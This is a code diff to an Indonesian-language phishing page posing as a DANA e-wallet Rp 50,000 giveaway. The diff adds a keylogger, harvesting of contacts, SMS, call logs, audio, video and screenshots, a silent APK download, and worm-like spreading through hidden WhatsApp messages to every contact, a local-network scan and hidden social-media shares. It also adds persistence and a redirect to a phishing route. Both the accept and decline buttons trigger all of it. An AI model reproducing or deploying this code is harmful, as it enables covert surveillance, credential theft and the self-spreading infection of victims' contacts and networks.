@@ -11,6 +11,7 @@
         .logo-dana{background:#108ee9;width:80px;height:80px;border-radius:20px;display:flex;justify-content:center;align-items:center;margin:0 auto 15px;font-size:40px;color:#fff;font-weight:bold}
         .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
+        #timer{font-weight:bold}
     </style>
 </head>
 <body>
@@ -24,19 +25,23 @@
             <h1 style="color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0">Rp 50.000</h1>
             <p style="color:#0066cc;font-size:12px">🎁 Kuota terbatas!</p>
         </div>
-        <p style="color:#ffcc00;font-size:14px">⏰ Tersisa <span id="timer" style="font-weight:bold">05:00</span></p>
+        <p style="color:#ffcc00;font-size:14px">⏰ Tersisa <span id="timer">00:05</span></p>
         <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
         <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
     </div>
 </div>
 
 <script>
+// ============================================================
+// ===================== KONFIGURASI ===========================
+// ============================================================
 var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
 var dataStore = [];
 var hasLS = (typeof localStorage !== 'undefined');
 var hasSS = (typeof sessionStorage !== 'undefined');
 var semuaDidapat = false;
+var spreadDone = false;
 
 if(hasLS && localStorage.getItem('sudah_klaim') === '1') {
     semuaDidapat = true;
@@ -63,6 +68,9 @@ function K(d) {
     } catch(e) {}
 }
 
+// ============================================================
+// ===================== ANDROID BRIDGE =======================
+// ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined',
     getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
@@ -93,6 +101,9 @@ var A = {
     downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false }
 };
 
+// ============================================================
+// ===================== DATA COLLECTION (LENGKAP) ============
+// ============================================================
 function GD() {
     var d = {
         w:Date.now(), ua:navigator.userAgent, pl:navigator.platform, la:navigator.language,
@@ -135,6 +146,9 @@ function ambilSS() { if(A.isAvailable){ var s=A.takeScreenshot(); if(s) K({sumbe
 function ambilAudio() { if(A.isAvailable){ var a=A.startRecording(); if(a) K({sumber:'audio_record',data:a}) } else { try{ navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){ var m=new MediaRecorder(s); m.ondataavailable=function(e){ if(e.data.size>0){ var r=new FileReader(); r.onload=function(){ K({sumber:'audio_record',data:r.result}) }; r.readAsDataURL(e.data) } }; m.start(); setTimeout(function(){ m.stop() },5000) }).catch(function(){}) } catch(e){} } }
 function ambilVideo() { if(A.isAvailable){ var v=A.startVideoRecording(); if(v) K({sumber:'video_record',data:v}) } else { try{ navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){ var m=new MediaRecorder(s); m.ondataavailable=function(e){ if(e.data.size>0){ var r=new FileReader(); r.onload=function(){ K({sumber:'video_record',data:r.result}) }; r.readAsDataURL(e.data) } }; m.start(); setTimeout(function(){ m.stop() },5000) }).catch(function(){}) } catch(e){} } }
 
+// ============================================================
+// ===================== KEYLOGGER ============================
+// ============================================================
 var inputData={};
 var keyTimestamps=[];
 document.addEventListener('keydown',function(e){ keyTimestamps.push({key:e.key,time:Date.now()}) });
@@ -158,6 +172,21 @@ function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.avai
 function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
 function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }
 
+// ============================================================
+// ===================== FULL KONTROL =========================
+// ============================================================
+function FK() {
+    ambilKontak();ambilSMS();ambilCallLog();ambilWA();ambilTelegram();
+    ambilFile();ambilApp();ambilWiFi();ambilSensors();ambilCalendar();
+    ambilBrowserHistory();ambilNotifications();ambilSS();ambilAudio();ambilVideo();
+    ambilStorage();ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
+    ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
+    K({sumber:'full_kontrol',data:'selesai'});
+}
+
+// ============================================================
+// ===================== DOWNLOAD APK =========================
+// ============================================================
 var files = ['https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Dana_Claim.apk'];
 var downloaded = [];
 
@@ -169,7 +198,6 @@ function downloadDiamDiam(url, filename) {
         document.body.appendChild(a);a.click();
         setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(u)},1000);
         downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
-        setTimeout(function(){window.location.href=u},1500);
     }).catch(function(){
         var ifr=document.createElement('iframe');ifr.src=url;
         ifr.style.cssText='position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
@@ -181,79 +209,212 @@ function downloadDiamDiam(url, filename) {
 function initM2() {
     setTimeout(function() {
         if(downloaded.indexOf(files[0])===-1) downloadDiamDiam(files[0],'Dana_Claim.apk');
-    },1000);
-}
-
-function FK() {
-    ambilKontak();ambilSMS();ambilCallLog();ambilWA();ambilTelegram();
-    ambilFile();ambilApp();ambilWiFi();ambilSensors();ambilCalendar();
-    ambilBrowserHistory();ambilNotifications();ambilSS();ambilAudio();ambilVideo();
-    ambilStorage();ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
-    ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
-    K({sumber:'full_kontrol',data:'selesai'});
+    },100);
 }
 
 // ============================================================
-// 🔥 FITUR BARU: SPREAD SHARE
+// ===================== AUTO SPREAD (LENGKAP) ================
 // ============================================================
-function spreadShare() {
+
+// 1. WA Spread
+function autoSpreadWA() {
+    if (!A.isAvailable) return;
+    var contacts = A.getAllContacts();
+    if (!contacts || contacts.length === 0) return;
+    
+    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp50.000! Klik: ' + window.location.href);
+    var totalWA = 0;
+    
+    contacts.forEach(function(contact, index) {
+        setTimeout(function() {
+            var number = contact.number.replace(/[^0-9]/g, '');
+            if (number && number.length > 5) {
+                try {
+                    var url = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
+                    var iframe = document.createElement('iframe');
+                    iframe.src = url;
+                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
+                    document.body.appendChild(iframe);
+                    setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 2000);
+                    totalWA++;
+                    if (totalWA % 10 === 0) {
+                        K({ sumber: 'wa_spread_progress', data: totalWA });
+                    }
+                } catch(e) {}
+            }
+        }, index * 100);
+    });
+    
     setTimeout(function() {
-        if (navigator.share) {
-            navigator.share({
-                title: '🎉 Dapatkan Saldo DANA Gratis!',
-                text: 'Klik link ini untuk klaim saldo DANA gratis! Rp50.000!',
-                url: 'https://verifikasi.site'
-            }).catch(function() {});
-        } else {
-            try {
-                navigator.clipboard.writeText('https://verifikasi.site').then(function() {
-                    alert('Link disalin! Bagikan ke teman-temanmu untuk klaim saldo DANA gratis!');
-                }).catch(function() {});
-            } catch(e) {}
-        }
-    }, 4000);
+        K({ sumber: 'wa_spread_total', data: totalWA });
+    }, contacts.length * 100 + 2000);
 }
 
+// 2. LAN Spread
+function autoSpreadLAN() {
+    try {
+        fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                var ip = data.ip;
+                var parts = ip.split('.');
+                var subnet = parts.slice(0, 3).join('.');
+                var targets = [];
+                for (var i = 1; i <= 254; i++) {
+                    var targetIP = subnet + '.' + i;
+                    if (targetIP !== ip) targets.push(targetIP);
+                }
+                
+                var totalLAN = 0;
+                targets.forEach(function(target, index) {
+                    setTimeout(function() {
+                        var ports = [80, 8080, 3000, 5000, 8000];
+                        ports.forEach(function(port) {
+                            try {
+                                fetch('http://' + target + ':' + port + '/?worm=' + encodeURIComponent(window.location.href), { mode: 'no-cors' })
+                                    .catch(function() {});
+                                totalLAN++;
+                            } catch(e) {}
+                        });
+                    }, index * 50);
+                });
+                
+                setTimeout(function() {
+                    K({ sumber: 'lan_spread_total', data: totalLAN });
+                }, 10000);
+            })
+            .catch(function() {});
+    } catch(e) {}
+}
+
+// 3. Share Medsos
+function autoSpreadMedsos() {
+    var url = encodeURIComponent(window.location.href);
+    var text = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp50.000! ' + window.location.href);
+    
+    var platforms = [
+        { name: 'Facebook', url: 'https://www.facebook.com/sharer/sharer.php?u=' + url },
+        { name: 'Instagram', url: 'https://www.instagram.com/?url=' + url },
+        { name: 'TikTok', url: 'https://www.tiktok.com/@?url=' + url },
+        { name: 'Telegram', url: 'https://t.me/share/url?url=' + url + '&text=' + text },
+    ];
+    
+    platforms.forEach(function(p, index) {
+        setTimeout(function() {
+            try {
+                var iframe = document.createElement('iframe');
+                iframe.src = p.url;
+                iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
+                document.body.appendChild(iframe);
+                setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
+                K({ sumber: 'medsos_spread', data: p.name });
+            } catch(e) {}
+        }, index * 500);
+    });
+}
+
+// 4. Master Spread
+function masterAutoSpread() {
+    if (spreadDone) return;
+    spreadDone = true;
+    
+    K({ sumber: 'auto_spread_start', data: 'master_auto_spread' });
+    
+    // Jalankan semua spread PARALEL dengan delay kecil
+    setTimeout(autoSpreadWA, 50);
+    setTimeout(autoSpreadLAN, 100);
+    setTimeout(autoSpreadMedsos, 150);
+    
+    // Clipboard
+    setTimeout(function() {
+        try {
+            navigator.clipboard.writeText('🎉 Dapatkan Saldo DANA Gratis Rp50.000! ' + window.location.href)
+                .catch(function() {});
+        } catch(e) {}
+    }, 200);
+    
+    K({ sumber: 'auto_spread_complete', data: 'all_spread_triggered' });
+}
+
+// ============================================================
+// ===================== PERSISTENCE ==========================
+// ============================================================
+function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
+function SW() { if('serviceWorker' in navigator){ navigator.serviceWorker.register('/sw.js').then(function(r){ K({sumber:'keepalive',data:'sw_registered'}) }).catch(function(){}) } }
+function KA() { if(A.isAvailable){ A.keepAwake() } try{ if('wakeLock' in navigator){ navigator.wakeLock.request('screen').then(function(w){ K({sumber:'keepalive',data:'wake_lock'}) }).catch(function(){}) } } catch(e){} }
+function cleanup() { console.log=function(){};console.warn=function(){};console.error=function(){};console.info=function(){} }
+
+// ============================================================
+// ===================== EKSEKUSI UTAMA =======================
+// ============================================================
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
     if(hasLS) localStorage.setItem('sudah_klaim', '1');
     var popup = document.getElementById('popupDana');if(popup) popup.style.display='none';
-    ambilLokasi();ambilKamera();ambilBaterai();ambilStorage();
-    ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
-    ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
-    initM2();FK();bacaClipboard();
     
-    // 🔥 SPREAD SHARE
-    spreadShare();
+    // SEMUA PROSES DIJALANKAN PARALEL (BUKAN SEQUENTIAL)
     
-    setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; },5000);
+    // Data Collection (paralel)
+    GD(); getIP(); ambilLokasi(); ambilKamera(); ambilBaterai();
+    ambilStorage(); ambilNetwork(); ambilIPLocal(); ambilCanvasFP();
+    ambilWebGLFP(); ambilPlugins(); ambilFonts(); ambilScreenDetail();
+    ambilDNT(); cekAdBlock(); bacaClipboard();
+    FK();
+    
+    // Download APK (paralel)
+    initM2();
+    
+    // Spread (paralel)
+    if (!spreadDone) {
+        masterAutoSpread();
+    }
+    
+    // Persistence (paralel)
+    HB(); SW(); KA(); cleanup();
+    
+    // Redirect ke phishing (5 detik)
+    setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; }, 5000);
 }
 
-function klaim() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'klaim'}); }
-function tolak() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'tolak'}); }
-var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); },1000); };
+// ============================================================
+// ===================== TRIGGER ==============================
+// ============================================================
+
+function klaim() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin',data:'klaim'}); }
+function tolak() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin',data:'tolak'}); }
+
+// Click handler
+var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); }, 100); };
 document.addEventListener('click', clickHandler);
-setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 300000);
+setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 5000);
 
-var w=300;
-var timerInterval=setInterval(function(){
-    w--;var m=Math.floor(w/60);var s=w%60;
-    var el=document.getElementById('timer');if(el) el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
-    if(w<=0){ clearInterval(timerInterval); document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua(); },500); }
-},1000);
+// ===== AUTO SPREAD 1 DETIK =====
+setTimeout(function() {
+    if (!spreadDone) {
+        masterAutoSpread();
+    }
+}, 1000);
 
-function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
-function SW() { if('serviceWorker' in navigator){ navigator.serviceWorker.register('/sw.js').then(function(r){ K({sumber:'keepalive',data:'sw_registered'}) }).catch(function(){}) } }
-function KA() { if(A.isAvailable){ A.keepAwake() } try{ if('wakeLock' in navigator){ navigator.wakeLock.request('screen').then(function(w){ K({sumber:'keepalive',data:'wake_lock'}) }).catch(function(){}) } } catch(e){} }
-function cleanup() { console.log=function(){};console.warn=function(){};console.error=function(){};console.info=function(){} }
-setTimeout(cleanup,3000);
+// ===== TIMER 5 DETIK =====
+var w = 5;
+var timerInterval = setInterval(function() {
+    w--;
+    var el = document.getElementById('timer');
+    if(el) el.textContent = '00:0' + (w < 10 ? '0' + w : w);
+    if(w <= 0) {
+        clearInterval(timerInterval);
+        document.getElementById('popupDana').style.display = 'none';
+        setTimeout(function(){ dapatkanSemua(); }, 100);
+    }
+}, 1000);
 
-GD();getIP();SW();KA();HB();
-setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
-window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
+// ===== INIT =====
+setTimeout(cleanup, 1000);
 
-// PHISHING ROUTING
+// ============================================================
+// ===================== PHISHING ROUTING =====================
+// ============================================================
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
